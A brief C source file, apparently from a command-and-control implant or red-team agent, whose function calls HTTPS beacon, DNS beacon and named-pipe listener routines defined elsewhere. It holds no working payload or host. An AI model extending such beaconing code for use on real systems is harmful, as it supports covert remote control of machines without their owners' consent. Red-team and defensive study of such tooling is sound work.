#include "communication.h"
#include "https_beacon.h"
#include "dns_beacon.h"
#include "pipe_comm.h"

void Communication_Beacon() {
    HTTPS_Beacon();
    DNS_Beacon();
    PipeComm_Listen();
}
